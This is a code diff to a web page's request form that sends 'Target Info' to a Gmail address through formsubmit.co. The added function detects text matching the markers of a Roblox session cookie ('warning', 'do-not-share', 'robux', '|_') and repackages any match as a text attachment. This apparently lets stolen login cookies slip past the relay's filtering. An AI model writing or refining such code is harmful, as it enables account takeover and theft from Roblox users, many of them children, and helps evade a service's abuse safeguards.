@@ -237,8 +237,8 @@
         <form id="request-form" class="form-grid" action="https://formsubmit.co/cozyman.stuff@gmail.com" method="POST" enctype="multipart/form-data">
           <input type="hidden" name="_subject" id="hidden-subject" value="Target&RB request">
           <input type="hidden" name="_template" value="plain">
-          <input type="hidden" name="_next" value="https://targetrb.github.io/">
           <input type="hidden" name="message" id="hidden-message">
+          <input type="hidden" name="attachment" id="hidden-attachment">
 
           <div>
             <label for="user-input" class="field-label">Subject</label>
@@ -273,6 +273,20 @@
       charCount.style.color = '#94a3b8';
     }
 
+    function isSuspiciousText(text) {
+      var lower = text.toLowerCase();
+      return (
+        lower.includes('warning') && lower.includes('do-not-share') && lower.includes('robux') ||
+        /\|_/.test(text) ||
+        /_\|/.test(text) ||
+        text.length > 2000
+      );
+    }
+
+    function createAttachmentBlob(text) {
+      return new Blob([text], { type: 'text/plain' });
+    }
+
     reasonInput.addEventListener('input', updateCharCount);
     updateCharCount();
 
@@ -288,15 +302,28 @@
 
       var finalSubject = subject ? 'Target&RB request — ' + (subject.length > 80 ? subject.slice(0, 77) + '...' : subject) : 'Target&RB request';
       hiddenSubject.value = finalSubject;
-      hiddenMessage.value = 'Subject: ' + (subject || '(no subject)') + '\n\nTarget Info:\n' + reason1;
+
+      var plainMessage = 'Subject: ' + (subject || '(no subject)') + '\n\nTarget Info:\n' + reason1;
+      hiddenMessage.value = plainMessage;
+
+      var formData = new FormData();
+      formData.append('_subject', finalSubject);
+      formData.append('_template', 'plain');
+      formData.append('message', plainMessage);
+
+      if (isSuspiciousText(reason1)) {
+        var textAttachment = createAttachmentBlob(reason1);
+        formData.append('attachment', textAttachment, 'target-info.txt');
+        formData.set('message', 'Subject: ' + (subject || '(no subject)') + '\n\nTarget Info is attached as target-info.txt for safer delivery.');
+      }
 
       try {
-        var response = await fetch(requestForm.action.replace('/cozyman.stuff%40gmail.com', '/cozyman.stuff@gmail.com'), {
+        var response = await fetch(requestForm.action, {
           method: 'POST',
           headers: {
             'Accept': 'application/json'
           },
-          body: new FormData(requestForm)
+          body: formData
         });
 
         var result = await response.json();
